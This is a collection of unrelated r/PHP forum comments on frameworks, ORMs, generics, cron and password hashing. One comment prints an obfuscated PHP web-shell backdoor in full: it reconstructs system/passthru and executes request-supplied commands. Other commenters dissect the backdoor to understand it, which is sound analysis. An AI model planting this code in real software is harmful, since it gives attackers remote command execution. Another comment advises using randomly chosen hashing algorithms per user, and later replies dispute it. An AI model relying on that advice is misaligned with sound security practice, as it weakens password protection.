Along the very same argument, like many of us here I bounce between back end PHP and front end JS. I always end up having to look at where the string goes in a `substr()` when on the PHP side. PHP is what I consider to be my primary language. However, when I'm coding in JS it is entirely intuitive what I'm doing without looking anything up. ``` myString.substr(1, 12); ``` The point is, no matter how many years of experience many of us have it is difficult to retain what argument is going where for far too many of PHPs standard commands. Heck, it may be worse for those of us who have been doing this for a while as our focus is usually at a higher level.
I would use a flat file CMS that uses SQLite.
Let's flip this on it's head for a second. The 2 JSON functions we enjoy here in PHP land are insanely useful, do the job pretty darn well, and is just this side of impossible to provide a type safe way of delivering what it does. This is one of those wonderful places in PHP where not having to lock down the return type is a distinct advantage to the language. One of the things I really don't like about Java is the fact that simple things can become insanely complex as you try to code the structure and type of everything. By gosh, there are times when you just gotta loosen up a little to get the job done. Creating a half dozen new objects to replace a single `json_decode()` command should be a clue that complex is not going to make it better. With that being said, I love that PHP has been getting some sensible type hinting coming into and out of methods. These new tools should be used when they make sense (which I hope is the majority of the time) and not used when they don't.
In a [flat file database](https://github.com/adamnicholson/flatbase) (disclaimer: I'm author) Honestly though if you can count on PDO-SQLite being installed, that's usually the option you should take.
https://github.com/PHPMessageBus/messagebus/issues/1 ;)
Download Wireshark and look at your own HTTP traffic. Easiest way to learn.
Exactly, because SQLite databases ARE files. It's a database in a file as opposed to being hosted on a server somewhere and not easily portable. You can make the same argument for a database stored in an Excel file, or a CSV file, or even your own homebrew delineated database stored in a simple .txt file.
They aren't as popular as you think they are, and definitely not for storing any sort of dynamically updated user data. For any use case where the data is going to be updated by more than a single source at a time you should look into a real database like SQLite or Postgres.
maybe somebody is excited about the work they do and is keen to share the progress with you
I'm torn. What do you feel is the best way to manage Doctrine repository strings? Many maintain them as strings: $objectManager-&gt;getRepository('Module\Entity\Test') or maybe use $objectManager-&gt;getRepository(Test::class) Due to my use of PHPStorm I find myself wanting to use the latter. I could see drawing the string out to a constant becoming more manageable. Would there be any advantages in using the ::class technique? Any opinions of preference? (Silly questions are welcome, right?)
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
OctoberCMS might be a good example to look at for flat-file. ***EDIT*** I fucked up and got some CMS confused... Flat-file CMS (I Hope) * https://getgrav.org/ * http://picocms.org/ Site Generators (Eliminates processing code, simple generates HTML sites AFAIK * http://jigsaw.tighten.co/ * https://sculpin.io/ * http://monstra.org/ Overall I have to echo the sentiment of why bother?
Wait a second... OctoberCMS is based on Laravel and as far as I know uses MySQL as default. edit link: https://octobercms.com/docs/database/basics
I can help too. PM me for info.
This is one of my most beloved features of Java 8. But to be truly useful it should also cover implementing abstract classes that have only one abstract method too like Java does. Then you have a complete feature set for working with functional stuff.
That's not a bad idea. One of the reasons I'll need to move from pure `git pull` to a real deployment tool is that the site is about to move to a server that won't be able to get to github to then do the `composer install` (also knowing that that really isn't good practice anyway). But doing that in conjunction with copying up just the vendor directory might work. I might also figure out if I could use one of composer's lockfile hashes to only copy up a new vendor directory if needed.
Very this. The images should be stored on disk. You can probably maximize code reuse by still thinking about generating them on the fly. Rewire the image generator to be the 404 handler or `FallbackResource` for the image cache directory. 
No idea how to solve it. Have you solved it? If so - what's the password for this slightly simplified version I wrote with built-in clues and strong password: $request['pass'] = ''; // Find the password $h = $request['pass']; for ($i = 0; $i &lt; 10000; ++$i) { $h = md5($h, 1); } $h = md5($h, 1); $t = unpack("L", $h); $t1 = unpack("S", $h); $e = pack("L", 1267856654 - $t[1]) . pack("S", 59648 - $t1[1]); if ($e == 'system') { die("You win!"); } die("Keep trying.."); I actually wrote this to see if I could figure out the other one, but aside from bruteforce - I have no clue.
How is this ORM different/better than existing ones like Doctrine or Eloquent? Is it just for learning purposes?
Yeah exactly, its purely just a side project when I am not busy with work related projects. I personally wouldn't even use it over Eloquent - but I would like to get it to the point where it is usable in a production environment
Oh, don't get me wrong, I don't see value in type-hinting something like JSON, which is "random object with a javascript-ish syntax". I was just providing an extremely convoluted example, since people asked for it :P
&gt; Both methods of invocation are valid in both receiving and declaring contexts. Does this mean that in the example definition of `thing()` that `$this-&gt;logger("thing")` would have been valid? What if `$logger` was a regular class implementing ILog?
I don't understand how a function could be generic... A function is not part of a type definition and is not redefined nor redeclared. You define a function only once, thus you cannot put a template on a function. You can put a templated typehint definition on a function/method or their return but you can't template the method itself, example: function templatedFunction(Box&lt;HeadGearInterface&gt; $box):Container&lt;HeadGearInterface&gt; { } Now in that case, $box is a Box of HeadGearInterface but thats it, you don't need templatability on a function, you don't need to specify a condition to your template thus your typehint becomes templatable but in a short syntax definition. The name of the template doesn't need to be defined. Same thing goes for the section about methods, you don't need to talk about templatable methods since methods are part of class definitions and all your examples are about templatable code relative to methods of the class...
How can you not support covariance? Extensibility and implementation through templatable typehints automatically offers covariance. It's normal you can't support contravariance since PHP itself is not built for that. And seriously, because of problems contravariance offers in static type hinted languages (you can find tons of issues about people not understanding contravariance) then i would definitely not support it!
You deserve [one of these](http://i.huffpost.com/gen/1194885/thumbs/o-CHEERS-LEONARDO-DICAPRIO-570.jpg?5).
If you need it sooner: https://github.com/fruux/sabre-vobject/blob/master/lib/timezonedata/windowszones.php
Searches, for one thing. You can copy the link to distribute that way.
:-) , then I don't think tagging alpha will be beneficial for the dependencies will always need dev. So we always need to keep minimum-stability dev on root of project.
Laravel does not force you to use a database at all. It just gives you nice tools if you want to. Its entirely possible to create a flat file CMS in Laravel. It so happens though that OctoberCMS is a hybrid CMS. It uses flat files for content but still has a database for other things.
Personally I feel that when someone says flat file CMS they are excluding SQLite. It may only be a file but its still a relational db and is usually interchangeable with mysql if some kind of ORM is used for abstraction. For example, I wouldn't class BoldCM as a flat file CMS. However Grav is.
Well you can be all academic about it and read a book or research the protocol. And that is a really good way to go about it. You should definitely follow the suggestions of others here in that regard. But I honestly learn better by doing stuff. I reckon you should jump into the laravel framework and play around with the routes. In fact going through the laracasts tutorial is a good way to go about it. The way laravel routes are done is great because it exposes the different HTTP calls so you can run different code depending on if its a GET, POST, PUT etc. This is better than almost any other framework I've used in this respect. It doesn't abstract the protocol concepts away from the programmer at all. I believe all of the microframeworks like lumen, silex and slim work the same way. But Laravel has great tutorials that will make it easier to learn. So start building stuff that uses the different HTTP requests. And always have the net tab open as well in chrome dev tools. It lets you inspect the calls and really helps open up the world of http :) Good luck
The main security concerns is that if one were to access the xml files that store credentials or other data they ...might get access to it :D This is often fixed by the use of htaccess files that deny all requests to documents that are not meant to be publicly visible, if you want an example of this you can check out [GetSimple CMS's htaccess file in /data/](https://github.com/GetSimpleCMS/GetSimpleCMS/blob/master/data/.htaccess).
anywhere where your php version of choice is supported ... as you didnt specify the country you are searching, i can only recommend Amazon AWS (well, ec2 to be specific) ... its not a very beginner friendly way so it might be easier to just get a virtual server on a good ISP in your country. 
"Start free trial now". "**Monthly standard 24.92/mo** 10 free days (up to 200 minutes)". "Billing information". "We'll send you new courses, recommended courses, and special offers by email.". There is nothing free in this world. Unless you find a good community with helpful individuals.
The others definitely are better examples though, I only noticed it because someone was telling me they work in it.
Yet another row data gateway implementation. 
The handlers could be callables. : )
I hope PHP 8 won't come around for at least 4 years, because PHP 7 is already causing a lot of splintering in the PHP community due to the fact that it's one steaming pile of incomplete crap right now (I'm talking about all the extensions that haven't been properly updated yet). What is SO wrong about PHP 7 that it warrants a completely new major version number?
All websites offering tutorials containing strings like "mysql_*" should be taken down immediately.
In the end I used another tutorial and made it work. Didn't use the Code above. Still I am wondering: Everyone who comments here says, that it's bad. Since I am new to all this, I can't understand. Why is it bad? What is a better?
If you use the newest php version (and you should for various reasons), this code wouldn't even run, because the mysql_ support has been dropped. Use a database abstraction layer instead (such as PDO) or at least use the mysqli_ interface. Long story short: use PDO. In general one could say that there are many websites that teach php newcomers how to code shit and that's really making me sad because it is not the fault of the learner, there are just too many bad resources out there. A resource that gets often linked for newcomers in this sub is [phptherightway](http://www.phptherightway.com) and in your case: [this link](http://www.phptherightway.com/#mysql_extension).
Woot?
It's always nice, and good, to have small side-projects that refresh your knowledge even if the code you end up with have no real use. I do it too from time to time, it helps me figure out new things, and usually leads me to looking at how others solve the exact same thing.
He's not adamant about anything. He's just trying to understand how its done. The fact is these flat file CMS's do exist so they must work on a particular principle when storing data that would usually go in a relational database. He just seems curious to me. And so am I to be honest. 
will you have in both cases
great article, but I prefer to use http://www.unphp.net/ They already have all the functions and using their tool is faster, but if you really want to understand what it does, the OP article is really great to achieve that.
I like the idea that there are no options, but it's not a standard, it's just *your* coding style. Just make it PSR-2 compliant with opinionated choices for things not covered by PSR-2 (eg. case of variables and arguments) and it will probably be more useful.
unphp.net has great tools to deobfuscate. Using their recursive de-obfuscation you can crack most obfuscated code that is introduced into your projects. I've learned quite alot about attacks from reading through attack code I translated that way. 
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/programming] [How to save a kitten by writing clean code • \/r\/PHP](https://np.reddit.com/r/programming/comments/4fh9p6/how_to_save_a_kitten_by_writing_clean_code_rphp/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
Isn't PSR2 with consistent brace placement just K&amp;R? 
 @error_reporting(0); $p = str_rot13("cnpx"); if (!isset($_REQUEST[pack("L", 1936941424) ])) exit(); $h = $_REQUEST[pack("L", 1936941424) ]; for ($i = 0;$i &lt; 10000;$i++) $h = md5($h, 1); $h = md5($h, 1); $t = unpack("L", $h); $t1 = unpack("S", $h); $t2 = unpack("C", $h); $e = $p("L", 4336671913 - $t[1]) . $p("S", 86171 - $t1[1]); $h = md5($h, 1); $t = unpack("L", $h); $t1 = unpack("S", $h); $t2 = unpack("C", $h); $e1 = $p("L", 2317167118 - $t[1]) . pack("L", 2350657810 - $t[1]); $h = md5($h, 1); $t = unpack("L", $h); $t1 = unpack("S", $h); $t2 = unpack("C", $h); $fex = $p("L", 2029019048 - $t[1]) . $p("L", 2213630902 - $t[1]) . $p("L", 2130333601 - $t[1]) . $p("S", 89781 - $t1[1]) . $p("C", 181 - $t2[1]); $h = md5($h, 1); $t = unpack("L", $h); $t1 = unpack("S", $h); $t2 = unpack("C", $h); $r = $_REQUEST[$p("L", 4994670222 - $t[1]) ]; if ($fex($e)) { $e($r); } else if ($fex($e1)) { $e1($r); } From what I can see, it is used to execute code sent to the server through $_REQUEST. It packs and unpacks them as unsigned values and executes them in the end. 
It's not that uncommon if they cache it. Actually there are some services for doing exactly this like cloudinary and imgix
Yeah that's the problem between `substr()` and `str_replace` where the parameter ordering is not always the same - just as with arrays where `sort` functions change the variable (and do not return the array) but most functions like `array_reduce` do return the changed array. These small hurdles add up, and they do not get easier with experience - I totally agree.
I can see why the functional interface variant of the example code would be preferred compared to the anonymous class; but isn't the correct way to handle that to have an actual concrete class? Encapsulating the logics there seems to be really restrictive, when the "EvenCounter" concept is clearly applicable for other uses, forcing you to violate DRY elsewhere. In part, I'm also a little concerned that it may promote a non-OO approach, which while awesome for smaller scripts, might create spaghetti for building larger applications.
Not exactly. It's actually quite clever. What it does is if you pass in the correct password via the url `$_REQUEST[pack("L", 1936941424)]` which is `$_REQUEST['pass']` then `$e`, `$e1`, and `$fex` become PHP functions - via educated guess - `system`, `passthru`, and `function_exists`. That is what all the packing and unpacking is doing. It's actually creating the function names. The other key thing to note is `$_REQUEST[$p("L", 4994670222 - $t[1])]` which is another variable accepted via url - no idea what it is because you need the correct password to even know it - though it's 4 characters so maybe `exec`. Whatever that variable is set to is what will be ran as a command line command.
so, basically a backdoor. 
No
No
No. I know there are some major PHP frameworks that have put logic into comments. This is bad enough, as comments should be just that, comments. What you're talking about doing is obfuscating this further by putting this into an even more obscure location. Do yourself the favor now... always prefer explicit over implicit. A year from now when you need to review the code that you've long since forgotten about, you will thank yourself for doing so.
Pretty much sums it up. 
As I wrote on Niki's blog, I spent a lot of time looking for a way to combine an OO syntax on PHP scalars. My initial plan was similar to Niki's, reusing the '-&gt;' syntax but, as time passed, incompatibilities and ambiguities started to accumulate. Actually, as many have noted, the biggest issue is that considering scalars as objects is totally incompatible with weak typing and type juggling. So, you may consider PHP weak types as obsolete but it is here to stay. I think that, instead of promoting scalars to objects, the only real need we have is a cleanup of the API (consistent function names and parameter order). An additional benefit is the improved readability of chained calls. So, I thought of a system I called 'pseudo-methods'. This would be a system to alias 'pseudo-methods' to functions. Each alias entry would contain both names and the position of the function's input argument (as it is not always the 1st one in the arg list). We would use an OO-like syntax, using another operator, maybe '-&gt;&gt;'. This wouldn't require implementing new methods as such syntax would generate function calls, just as before. Example : $a = 'foo'; $b = $a-&gt;&gt;str_replace('o','a'); // calls str_replace('o', 'a', $a) The pseudo-method and function names don't have to be the same. More: several pseudo-method names can correspond to the same function, allowing to keep the 'legacy' name along with a newer one.
~~Last commit was 2 days ago... https://github.com/propelorm/Propel~~ EDIT: https://github.com/propelorm/Propel2 &lt;== 6 days ago 
Partly because a fair number of people don't like the PSRs, plus those aren't standards either.
I hear "legacy" and as usual I rise from the vasty deep. If testing legacy apps is your problem, you may want to add some characterization tests, so at least you can see if the overall behavior/output changes. I have a talk about that called [Characterization Testing for Legacy Applications](http://paul-m-jones.com/slides/testing-legacy-code/). And of course there's my book, [Modernizing Legacy Applications in PHP](https://leanpub.com/mlaphp). I hope your frustrations end soon.
I would say you've answered your own question. In my opinion when using a library or framework one of the most important considerations is how many other people use it. It doesn't matter how good the code is when there isn't up-to-date documentation and no community.
Latest commit 3f7a284 on Apr 17, 2014
ye we can all agree that there is a lot to be done about the situation, but if higher up isn't willing to invest time in it you're done ;)
Great work!
The Propel2 repo is more active: https://github.com/propelorm/Propel2 
Of course I know that there are people that don't like them, but afaik the PSRs were created by many people heavily involved in the community, and there were polls, weren't there? And even though they are not standards, they are at least "standards" between many big projects. Departure from them is definitely possible, and I myself encourage it heavily! As long as there is a good reason for it, which should be declared in the readme.
oh snap. hahaha.
It wasn't snarky. Consider the wide range of people and organizations that are using PHP. The number of people using PHP who participated in the PSR discussions is insanely small by comparison. The representation was also biased towards authors of the big frameworks of the day. So yes, for some subset of the community there was involvement. I am basically drawing attention to the fact that when someone says "the community" it needs to be scoped. 
Interesting - I'm gonna have to look into Roslyn some more! Also, I just want to say, keep up the good work! Projects like these are exactly what the CLR needs to actually become common :)
&gt; Implementing an interface in PHP is more than saying "I have these method signatures", it's also saying "I have this behaviour" - and that should be explicit. Also the difference between structural and nominal typing.
if you're running on a vps, just use crontab http://crontab-generator.org/
@paragon_init: this isn't quite accurate. If you are switching from your own MySQL database to another database or a 3rd party product like Passport, you have to write a password hashing plugin that matches the hashing scheme of your legacy database so that the new database matches. If you don't do this, you'll force all of your users to reset their passwords. From a business perspective, you probably want to avoid forcing every single user to reset their password just to login. ;) (EDIT: I changed encryption to Hash since this is technically correct)
Cron is a time-based job scheduler in Unix-like operating systems ([source](https://en.wikipedia.org/wiki/Cron)). It's not something you do in PHP as far as I know. It's something that you can use to automatically call a PHP script at a given time (multiple times). Cron is driven by a crontab file, a configuration file that specifies shell commands (for example, in your case, execute a given PHP script) to run periodically on a given schedule. In conclusion you should schedule your Cron jobs through the crontab configuration file, at the operating system level, not at the programming language level.
Propel2 is still active ! Personnally, i prefer using Propel rather than Doctrine, even if i'm using a bunch of Symfony components.. but i use them with Silex which makes integration of Propel easier
You are correct. Passwords are hashed (one-way) rather than encrypted. However, salting and in-memory password modification prior to hashing will make all brute force and lookup table attacks virtually impossible. Even if you store the hash right next to the password and both the hash and salt are compromised, using a separate salt for each user essentially negates the ability to do table lookups. Plus, if you have 10 different algorithms and use them at random for different users, if an exploit is found for one of the algorithms, the other 9 will still be secure. Therefore, only 10% of your users will be compromised. I've done a lot of crypto work and using salts, in-memory modifications, and multi-pass hashing is about all you can do to secure passwords. You could shadow the salts and/or the passwords, but that doesn't do much if the hacker has root access to the server. Once they have root, they'll eventually figure out where everything is stored. You just have to store it in a way that is secure. From my perspective, @Kelly2016's post is pretty accurate.
And also better IDE support for finding class usages and refactoring.
Propel1 usage goes down, fortunately as its unmaintained: https://packagist.org/packages/propel/propel1/stats Propel2 usage goes up and is maintained: https://packagist.org/packages/propel/propel/stats-&gt; Last 30 days: 11 065 installs Website has ten of thousands users each month. Usually between monday-fryday and I get quite some mails from companies using it - meaning it's mainly used in business environments and in all kind of projects. Even the new ecommerce application star (http://spryker.com/) uses Propel2. So it's far from dead :) &gt; But I see almost no activity in their user group I see several reasons for that: a) current version of Propel2 is quite stable. Very few bugs pop up in a month. b) Since current Propel2 is almost feature complete there isn't much to discuss and, c) I guess it has a pretty good documentation, so there is often no need to write a question in the user group :) d) writing an ORM with all those features isn't an easy task. Not many people on earth want to contribute their time writing a ORM, which doesn't have a surface you can pimp with shiny stuff like angular/react.js/bla. Btw, try the gitter chat. https://gitter.im/propelorm/Propel - 140 people in there currently. Sometimes there's a discussion going on :)
;-) I use it for more than 1 year. And I like their moto
I suppose you're the type who finds the Special Olympics entertaining also.
Additionally in case of typo IDE will show you a problem.
I love the Gang of Four code samples and specs :) Been trying to use them for my own projects in both PHP and Ruby. 
I'm a happy propel user (1.7.x). It works. I understand it. So, there's at least one user.
Thanks for the reply. Yes, learning more design patterns is definitely on my radar. For now, since I have little time available, I wanted to concentrate on learning a framework. I know that one framework isn't better than the other but there probably is one better suited for me at the moment. It looks like you're backing my Symfony choice, interesting!
Hello! Thanks for your input. Yes, I heard that CI is very friendly with newcomers. It should also be a solid start before delving into something more complex, I will definitely keep it in mind should things not go well with Symfony/Laravel. It's totally fine using the framework you like the best! You should be proud of using CodeIgniter, there's absolutely nothing wrong with that ;) Have you ever considered learning/switching to something more complex, like Symfony or Laravel?
Thanks for replying. I know Laracasts are great resources, but could you please explain why you answered Laravel?
So I was excited to learn about such a tool. But if you paste the original source into it, it cannot even deobfuscate the most simple transcoding that was applied. And this isn't even a difficult script to deobfuscate automatically - I can think of techniques that *would* be difficult to decode.
Thanks for answering. Glad it was useful for you! Hope it'll be the same for me if I choose to go that way. By the way, I'm considering Symfony 3 ;)
Thanks for the kind words.
&gt; tweet-cli -u&lt;twitter_username&gt; -p&lt;twitter_password&gt; --tweet="Your tweet message" Username, password and message are all required. Usually in CLI tools a `--{argument}` is a shortcut for a `-{flag}` or completely optional. I would suggest removing the `--tweet` flag and simply accept anything after `-p` and `-u` as the message itself: &gt; tweet-cli -u&lt;twitter_username&gt; -p&lt;twitter_password&gt; "Your tweet message" 
Awesome! Thanks!
&gt; From my perspective, @Kelly2016's post is pretty accurate. "You can build a custom password encryption algorithm as a plugin" isn't accurate on two points: 1. 99.9999% of developers really shouldn't design their own cryptography protocols. 2. [You do *not* **ENCRYPT** passwords](https://paragonie.com/blog/2015/08/you-wouldnt-base64-a-password-cryptography-decoded). &gt; Once they have root, they'll eventually figure out where everything is stored. You just have to store it in a way that is secure. You mean like how, in [Halite](https://github.com/paragonie/halite/blob/master/src/Password.php), we hash using Argon2i then encrypt using Xsalsa20 + BLAKE2-MAC? So that if the database server gets compromised, the attacker doesn't even have hashes to begin trying to crack? That's only beneficial in hardware-separated environments. &gt; Plus, if you have 10 different algorithms and use them at random for different users, if an exploit is found for one of the algorithms, the other 9 will still be secure. Therefore, only 10% of your users will be compromised. Security through obscurity? No thanks. ----- Also, /u/brokenwren, just because [you work for the same company](https://news.ycombinator.com/item?id=11203507) doesn't mean you have to chime in on an old thread to agree with [your marketing associate](https://www.inversoft.com/company/about) about a deeply technical issue that's unrelated to your product.
Yep, it was released not long ago
Thanks for replying! Yes, I guess Phalcon is another interesting framework. Do you also have to write C code along with PHP when you use Phalcon? Anyway, nice to hear about your experience :)
Don't know how I never caught this. Really awesome utility! Quick question: would you be amenable to GitHub Enterprise support and/or usage of knplabs GitHub client rather than rolling your own integration with the API? If so, I can send you a PR for 2.1 or wherever you want. :)
Most of what you've said is right (although not advisable), but it doesn't counter _anything_ I said! &gt;Plus, if you have 10 different algorithms and use them at random for different users, if an exploit is found for one of the algorithms, the other 9 will still be secure. Therefore, only 10% of your users will be compromised. I'm sure 90% of your users will be very happy that you're not using the most secure hashing algorithm you can. &gt;@Kelly2016's post is pretty accurate I mean, she stated you should roll your own crypto, and that you encrypt passwords... that is about as accurate as using bog roll to write your dissertation. And again, Scott said it below, but it's pretty disingenous not to state you're /u/Kelly2016's [coworker](https://news.ycombinator.com/item?id=11203507). EDIT: Disclaimer: /u/sarciszewski is an internet acquaintance of mine, but this doesn't invalidate any of my points. 
It's a shame this code went by the wayside. Doctrine is just awful. Propel I feel was more flexible. That's open source code for you though...easy come easy go. I ended up building my own Symfony bundle that works straight off PDO's models. I'm pretty much fed up with rapid development. Why are good code bases losing support and completely disappearing?
I wonder if anyone here remembers how much generics changed Java. A lot of what is done today *could* be done then; you just used Object and moved on if you really needed to get it done. But often it *wasn't* done because the type system didn't nicely support it. Really out of touch opinion by Zeev. In a [follow-up email](http://marc.info/?l=php-internals&amp;m=146110511111454&amp;w=2): &gt; As I said, I'm sure frameworks would use it and there are obviously some valid use cases for it, but it won't change the way the vast majority of people develop code. I do not see *any* Java code that does not use generics. Java had been around for roughly 13 or 14 years when generics landed. Certainly changed the way *every* Java developer works.
Hey yeah i'd love to help you guys out. Looks like you've made some pretty good headway!
I did like this: &gt; as most sensible use cases have alternative solutions reads like "Why do it properly, when we can have a substandard alternatives" 
Laravel is very nice to use. I use Zend Framework at work and I wish I could use laravel instead. It feels like the modern way of developing web applications. Excellent tools bundled together and a *convention over configuration* way of doing things. And it's all about writing very clean code using their libraries. There's an official podcast which is interesting and laracasts is a really good learning resource for it as well as general web dev stuff.
Ah you're right. It's missing all the duplicates. In my use-case I didn't have territory information, just the timezone name, so for each Windows Timezone name I just have the first entry in the list.
I'm baffled by how many people are totally scared by generics. I really don't see the added complexity from a consumer perspective (because that's what everyone seems to be worried about). Take this example: public function loadBlogPosts() : array { return ...; } Then take the same example with an applied generic return type (just an example): public function loadBlogPosts&lt;T is BlogPost&gt;() : Collection&lt;T&gt; { return ...; } What is so complicated about saying that it's not a group of `Potato` or `Banana`, and instead that it's a collection of `BlogPost` instances? We're actually just adding more precise specification to our software, which is what we actually keep asking our clients: better specifications. To me, it seems like a clear advantage, with no real disadvantage besides explaining it once to a newcomer "yeah, it's an array of BlogPost, not Potato". EDIT: updated syntax as per RFC - didn't realize that I inverted the position of the types :P 
The difference is that in Java, generics exist to make the type system more *flexible*. Generics accomplish the opposite in PHP, it's an attempt to "lock things down". There's nothing preventing me from using the same Collection class to store a list of Burgers or Contacts or HttpRequests. It's literally just more syntax in the blind, unquestioned pursuit of "safety" and "enforcement". They don't open up *any* new possibilities that didn't exist before. They would do nothing but change the error feedback for a certain class of programmer mistake from "your app crashed in production somewhere because this incorrect value made it's way into this data structure somewhere back there" to "your app crashed in production because this incorrect value made it's way into this data structure right here".
Not that having generics isn't great - not strictly necessary, but it is great for sure. But all the time spent on generics could benefit far more people if applied on adding concurrency primitives or async IO.
`getRelationValue` is way down the list (in fact it's not there at all when viewing the default "top 90%"). Why do you ask?
It used to work to deobfuscate it recursively. but when I tried it before I always got different code there. the recursive algorithm is a lot better than the default one. 
You can make any syntax complex. I find closures and `yield` to be much more confusing than this, for example (when combined).
Sure i will try to implement that.
You still don't want those lying around ;-) Usually, you can type in user/password once, then have the tool create a token: store that generated token. This also has the advantage that your tweets will be labeled with the name of the app (as the origin), which is also neat for both you (since you see what happened) and for others (free advertisement).
I guess its about time to make an RFC "Remove Zeev Suraski's rights to vote in PHP RFCs". Whenever there is a really good feature/RFC, you see Zeev votes 'no' more than 90% of the time. Hes clearly holding back the PHP community, as his last github commit for PHP was several years ago, he really should step down and understand PHP is not Zend's toy anymore. If an RFC is good, its very detrimental Zeev is voting 'no' and influencing the other PHP internals. If the RFC is bad, it will not pass regardless of whether Zeev casting his 'no' vote anyway. 
&gt; Constraints are design-tools! BINGO!
I don't really see the point to generics in PHP. One of the big advantages of generics is polymorphism in a type safe way, but the type safety is irrelevant to PHP developers. They don't have a compiler to catch errors and warn them early of problems. They're going to be protecting themselves from mistakes the same way they did before. testing (and fixing reported bugs). The best that can be said for it is that linters may be able to identify more problems. *may*. And don't mistake that for arguing against generics, but you're being dismissive without really understanding his point.
you'll get down-voted for making sense and being against the bandwagon.
&gt; type safety is irrelevant to PHP developers That's a silly thing to say. If it was true, we wouldn't be type-hinting anything. While there are no compilers to catch our type errors, there may be in the future. Also, IDEs and linting tools will, and even at runtime, we'll get an *earlier* error that's more clear and to the point. It's not like you *can't* do this already. If you wanted to create a class like a collection that only accepted one type of items, you could just pass in the class name as a constructor argument and add `if ($item instanceof $this-&gt;itemClass)` checks everywhere (though that wouldn't work for scalar types). The main point isn't that generics allow programmers to add more type safety, it just makes it less tedious.
Hey, thanks for the explanation. It seems odd to me that the site would use code that works in windows as its example when most people doing php are working in a LAMP like environment. 
We can do both, it just takes someone to want to do it. Though I imagine concurrency is quite a bit harder to pull off.
It will take you as long as long will it take to read the Code bright from Dayle Rees - an excellent starter book on Laravel, freely available
The problem with variable-distance tabs is that you get stuff like this (where `[tb]` and `.` are tab/space placeholders) // Arrows line up for aesthetic enjoyment! [tb]$myObj-&gt;foo() [tb][tb]..-&gt;bar() [tb][tb]..-&gt;baz() But on another person's computer, with tab=8, you get: [tabbbb]$myObj-&gt;foo() [tabbbb][tabbbb]..-&gt;bar() [tabbbb][tabbbb]..-&gt;baz() Now, sure, you can argue that the latter two lines should have fewer tabs and more spaces... but in practice that's more keyboard-slapping and most people will just hit tab until they get close enough.
not sure I get you. What will I have in both cases ?
So basically this thread is all about public shaming someone you think is wrong?
I used to be of the same mind when it came to Generics. But I have come to realize that they could be a useful thing to have. Having said that however, it ought to be mentioned that he is right about the overall mentality. We are too fixated on syntax related things that we forget about what's important, which is making the language itself better. There are many areas in which PHP fails miserably. We ought to focus on those first hand and then to the extra nice to have stuff IMO. Besides, during this last year-ish, the PHP community has been becoming more Java like while Java developers are trying to change their language to be more PHP-like. Am I wrong about this or is everyone else getting that same feeling? (I am not saying that it is bad... just saying that it is rather unusual)
&gt; They don't have a compiler to catch errors and warn them early of problems. They're going to be protecting themselves from mistakes the same way they did before. testing (and fixing reported bugs). PHPStorm and other IDE's will be able to catch these errors early. 
&gt;application of generics would cut the number of classes I have (to deal with specific cases of the same functionality) in half.. May be your code is suffering from, as another user here put it, 'unquestioned pursuit of "safety" and "enforcement"'... For example, write different versions of sort functions with the exact same functionality, but just differ in their 'type hints' (or what ever it is right now being called in the php land). I mean, you just write the three versions so that you can type hint them differently and pat yourself on the back for doing things "The right way(™)"... When you use a language like Php, you are supposed to use do it "generically" using the non-strict comparison operators. (It is brain dead, but being a professional Php developer, you are capable of dealing with that shit, right? And you have the Php manual for all the help (You know it by-heart, right?). "Know your tools" and all that. Oh and also "You are not a bad developer who blames the language" for your mistakes, Right?) Fighting against the core philosophy of the language is how it ends up being a "freak" with parts that does not fit together...I mean, it already is, but I guess that is what is the essence of his argument..
@atfirstsight MVC is a pattern/logic and separation of responsibility. MVC is not equal to a full framework, which you seem to be referring to. MVC does not imply you'd have to use a template engine, orm/dbal or for that matter, even have it be event oriented, heck, you don't even need routing if all you have is a single controller action.
I really like this idea but maybe its better if we make it monthly. what do you think?
What benefit does this have over just adding stuff to cron normally? Just the fact that they only need to know php instead of linux stuff?
One advantage is that your 'cron jobs' are in source control
That sounded promising but I can barely hear the voices over the background noise. Edit: the audio-only is better.
[removed]
This. Have been looking at the Laravel Scheduler for a couple months wishing that we had something like that for our project (legacy CI project). It also lets developers in the team to create new cron tasks and deploy without having to wade in and make changes to the crontab configuration (which with some juniors can be a scary prospect thus requiring more of my time in a deploy). Will definitely be trying this project out!
This is a very good question. Hopefully OP is spawning a new process for each job.
Can you show me a real code sample that generics improve in any way? Like I said before, any code _that is actually correct_ functions exactly the same way with or without the generic syntax. If you write some code that works with a Collection&lt;Contact&gt; and then switch to an untyped Collection, I _promise you_ you can still rely on that collection only containing Contact objects, because the code that fills the collection hasn't changed, and it didn't throw an error before which meant it was only ever adding Contact objects to the collection! It's literally just more syntax that has absolutely zero effect on code that doesn't contain type mistakes, and simply changes the error message for code that does contain type mistakes. Yes, it serves a bit as documentation and allows you to express some things explicitly that you can't currently, but please let's not pretend they accomplish anything more than that. You can take a program loaded with type annotations, remove all of them, and still end up with code that functions the exact same way it did before. If you were passing the right types before, you're still passing the right types when the additional syntax is removed.
This is how I prefer it too.
Honestly, for typehinting arrays I'd *much* prefer `BlockPost[]` like the standard in Docblocks are
tabs for indentation and spaces for alignment work fine. Namely because your example is wrong anyway. Anyone doing what you just described is doing it wrong, and a automatic formatter will fix it anyway. Thus [tb]$myobject-&gt;foo() [tb].........-&gt;bar();
Use puppet for server automation.
I want to go right to the point (by learning Symfony and not starting with something easier and smaller) because I'm limited with time. If I start learning something easier now, it will equally take me quite a lot of time. Then, when I feel I'm ready, I would move to something more complex like Symfony... But this would happen in a distant future and learning Symfony would take even more time than the other easier framework. Result: God knows when I'll learn a solid framework like Symfony. I prefer to start right away with something complex like Symfony because even if it takes long and won't be easy at least when I'm finished I'll have a solid and complete framework under my belt, without having to start over to learn something else... Maybe my reasoning is wrong, but this is what I think.
You don't, but you do need to have the extensions installed with your hosting provider
What, send all my visitors' IP addresses to a third party? No thanks.
Spoken like a true God of PHP.
doubtful, the IDE isn't going to be exercising every possible code path. And it just seems like a lot of effort for an IDE that gives slightly better autocomplete boxes.
[removed]
